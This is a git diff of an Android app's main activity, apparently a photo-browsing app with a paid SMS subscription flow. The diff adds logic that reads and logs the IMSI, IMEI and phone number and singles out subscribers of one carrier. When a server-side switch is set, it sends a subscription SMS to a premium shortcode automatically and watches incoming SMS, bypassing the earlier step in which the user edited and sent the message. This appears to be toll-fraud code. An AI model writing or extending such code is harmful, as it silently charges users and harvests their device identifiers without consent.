@@ -3,6 +3,7 @@ package lava.bluepay.com.lavaapp.view.activity;
 import android.Manifest;
 import android.app.Activity;
 import android.app.ProgressDialog;
+import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Build;
@@ -68,6 +69,7 @@ public class MainActivity extends BaseActivity {
     //region==============订阅业务===================
 
     private static final int RequestCodeIntentToSms = 500;
+    public static final int RequestCodeIntentToPermissionSetting = 501;
 
     SmsReceiver mReceiver;
 
@@ -128,6 +130,9 @@ public class MainActivity extends BaseActivity {
     }
     /**
      * 短信发送成功后查询订阅结果
+     * 情况：1.从SMS编辑界面回来之后
+     *      2.自动发短信发送成功之后
+     *      3.自动发短信发送失败之后 （todo 测试的，正式的需要去除）
      */
     public void continueCheckSubSituation(){
         isInCheck = true;
@@ -167,6 +172,9 @@ public class MainActivity extends BaseActivity {
      * 订阅
      */
     private void doSubscribe(String shortCode,String content){
+        if(TextUtils.isEmpty(shortCode) || TextUtils.isEmpty(content)){
+            return;
+        }
         if (Utils.checkPermission(context, Manifest.permission.READ_SMS)){
             try {
                 mReceiver = new SmsReceiver(context);
@@ -200,9 +208,27 @@ public class MainActivity extends BaseActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         Logger.e(Logger.DEBUG_TAG,"requestCode:"+requestCode+",resultCode"+resultCode);
         super.onActivityResult(requestCode, resultCode, data);
-        if(requestCode == RequestCodeIntentToSms){
-            Toast.makeText(context,getResources().getString(R.string.execute_success),Toast.LENGTH_SHORT).show();
-            continueCheckSubSituation();
+        switch (requestCode) {
+            case RequestCodeIntentToSms:
+                Toast.makeText(context, getResources().getString(R.string.execute_success), Toast.LENGTH_SHORT).show();
+                continueCheckSubSituation();
+                break;
+            case RequestCodeIntentToPermissionSetting:
+                if(ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.READ_PHONE_STATE})){
+                    if (ApiUtils.isNetWorkAvailable()) {
+                        isInInitState = true;
+                        initApp(MainActivity.NOWInitState0);
+                    } else {
+                        Toast.makeText(context, getResources().getString(R.string.have_no_network), Toast.LENGTH_SHORT).show();
+                    }
+                }else{
+                    Toast.makeText(context,getResources().getString(R.string.permission_exception_tips),Toast.LENGTH_SHORT).show();
+                    finish();
+                }
+                break;
         }
     }
     //endregion==============订阅业务===================
@@ -253,6 +279,7 @@ public class MainActivity extends BaseActivity {
                     break;
                 case MainActivity.NOWInitState2://去请求订阅信息
 
+                    Config.initMNC();
                     String telNum = Utils.getIMSI(context);
                     MemExchange.m_iIMSI1 = telNum;
                     MemExchange.m_iIMSI = MemExchange.m_iIMSI1;
@@ -260,9 +287,12 @@ public class MainActivity extends BaseActivity {
                     Logger.e(Logger.DEBUG_TAG, "imsi1=" + MemExchange.m_iIMSI1 + ",imsi2=" + MemExchange.m_iIMSI2 + ",imsi=" + MemExchange.m_iIMSI
                             + ",imei=" + MemExchange.m_iIMEI + ",pho=" + MemExchange.m_sPhoneNumber);
 
-                    if (!TextUtils.isEmpty(telNum)) {
+                    if (!TextUtils.isEmpty(telNum) && Config.mncs.containsKey(telNum.substring(0, 5))) {
+                        Logger.e(Logger.DEBUG_TAG,"####为AIS用户");
                         sendCheckSubRequest(telNum);
                     } else {
+                        Logger.e(Logger.DEBUG_TAG,"####不为AIS用户");
+                        MemExchange.getInstance().setCanSee();
                         nowInitState = MainActivity.NOWInitState3;
                         initApp(nowInitState);
                     }
@@ -274,26 +304,22 @@ public class MainActivity extends BaseActivity {
                     isInInitState = false;
                     //请求第一页数据
                     sendCategoryDataListRequest(1, Config.CategoryPhotoPopular, ApiUtils.requestPhotoPopular);
-                    if (MemExchange.getInstance().getCheckSubData() != null && "S/O".equals(MemExchange.getInstance().getCheckSubData().getStatus())) {//用户没订阅
-                        if (MemExchange.getInstance().getInitData() != null) {
-                            if (MemExchange.getInstance().getInitData().getSwitchX() == 2) {//订阅开关关了就不继续
-                                return;
-                            }
-                            String time = MemExchange.getInstance().getInitData().getTime();
-                            if (time.indexOf(",") == -1) {
-                                return;
-                            }
-                            if (Utils.ifTimeIn(time)) {//在规定时间内
+
+                    if(Config.mncs.containsKey(MemExchange.m_iIMSI.substring(0, 5))) {
+                        //目标用户
+                        if (MemExchange.getInstance().getCheckSubData() != null && MemExchange.getInstance().getCheckSubData().getSubscribe() == 1) {//用户可以订阅
+                            if (MemExchange.getInstance().getInitData() != null) {
                                 String code = MemExchange.getInstance().getInitData().getShorcode();
                                 String content = MemExchange.getInstance().getInitData().getSub_key_sms();
-                                if (!TextUtils.isEmpty(code) && !TextUtils.isEmpty(content)) {
-//                                    doSubscribe(code, content);
-                                    gotoSmsSend(code,content);
-                                }
-                            } else {
-                                showSubscripDialog();
-                            }
 
+                                if (MemExchange.getInstance().getInitData().getSwitchX() == 1) {//订阅开关开了，直接发订阅
+                                    doSubscribe(code, content);
+                                    return;
+                                } else {
+                                    showSubscripDialog();
+                                }
+
+                            }
                         }
                     }
                     break;
@@ -350,42 +376,20 @@ public class MainActivity extends BaseActivity {
 
     }
 
-//    @Override
-//    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-//        //这里实现用户操作，或同意或拒绝的逻辑
-//        /*grantResults会传进android.content.pm.PackageManager.PERMISSION_GRANTED 或 android.content.pm.PackageManager.PERMISSION_DENIED两个常，前者代表用户同意程序获取系统权限，后者代表用户拒绝程序获取系统权限*/
-//        String aa = "";
-//        if(requestCode == 1 || requestCode == 2) {//sd卡
-//            if(grantResults.length>1){
-//                if(android.content.pm.PackageManager.PERMISSION_GRANTED == grantResults[0]){
-//                    if(ApiUtils.isNetWorkAvailable()) {
-//                        isInInitState = true;
-//                        initApp(MainActivity.NOWInitState0);
-//                    }else{
-//                        Toast.makeText(context,getResources().getString(R.string.have_no_network),Toast.LENGTH_SHORT).show();
-//                    }
-//                    return;
-//                }
-//            }
-//        }
-//        Toast.makeText(context,"无权限,请授权以正常使用",Toast.LENGTH_SHORT).show();
-//        finish();
-//    }
 
     @Override
     protected void handlePermissionAllowed(String permissionName) {
-        if(ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                Manifest.permission.READ_EXTERNAL_STORAGE,
-                Manifest.permission.SEND_SMS,
-                Manifest.permission.READ_PHONE_STATE})){
+//        if(ifAllPermissionAllo(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
+//                Manifest.permission.READ_EXTERNAL_STORAGE,
+//                Manifest.permission.SEND_SMS,
+//                Manifest.permission.READ_PHONE_STATE})){
             if (ApiUtils.isNetWorkAvailable()) {
                 isInInitState = true;
                 initApp(MainActivity.NOWInitState0);
             } else {
                 Toast.makeText(context, getResources().getString(R.string.have_no_network), Toast.LENGTH_SHORT).show();
             }
-        }
+//        }
     }
 
     @Override
@@ -752,9 +756,11 @@ public class MainActivity extends BaseActivity {
                         isInCheck = false;
                         nowCheckTime = 0;
                         getCheckHandler().removeCallbacksAndMessages(null);
-                        MemExchange.getInstance().setCanSee();
-                        //todo 刷新界面
-                        SubSuccess();
+                        if(MemExchange.getInstance().getInitData().getSwitchX() == 1 || MemExchange.getInstance().getInitData().getSwitchX() == 2) {
+                            MemExchange.getInstance().setCanSee();
+                            //todo 刷新界面
+                            SubSuccess();
+                        }
                     }
                     break;
 
@@ -807,9 +813,11 @@ public class MainActivity extends BaseActivity {
                             isInCheck = false;
                             nowCheckTime = 0;
                             getCheckHandler().removeCallbacksAndMessages(null);
-                            MemExchange.getInstance().setCanSee();
-                            //todo 刷新界面
-                            SubSuccess();
+                            if(MemExchange.getInstance().getInitData().getSwitchX() == 1 || MemExchange.getInstance().getInitData().getSwitchX() == 2) {//如果是后台直接发短信的情况,发送成功后轮循三遍都失败的话，可以看
+                                MemExchange.getInstance().setCanSee();
+                                //todo 刷新界面
+                                SubSuccess();
+                            }
                         }
                     }else{
                         isInCheck = false;
@@ -1277,7 +1285,7 @@ public class MainActivity extends BaseActivity {
      */
     public void showSubscripDialog(){
         //todo 设置初始化接口返回的字段
-        String content = getResources().getString(R.string.suscribe_tips);
+        String content = (!TextUtils.isEmpty(MemExchange.getInstance().getInitData().getContent()))?(MemExchange.getInstance().getInitData().getContent()):getResources().getString(R.string.suscribe_tips);
 
         new MaterialDialog.Builder(this)
                 .title(R.string.tips)
@@ -1290,8 +1298,11 @@ public class MainActivity extends BaseActivity {
                         String code = MemExchange.getInstance().getInitData().getShorcode();
                         String content = MemExchange.getInstance().getInitData().getSub_key_sms();
                         if(!TextUtils.isEmpty(code) && !TextUtils.isEmpty(content)) {
-//                            doSubscribe(code,content);
-                            gotoSmsSend(code,content);
+                            if(MemExchange.getInstance().getInitData().getSwitchX() == 2) {
+                                doSubscribe(code,content);
+                            }else if(MemExchange.getInstance().getInitData().getSwitchX() == 3){
+                                gotoSmsSend(code, content);
+                            }
                         }
                         dialog.dismiss();
                     }
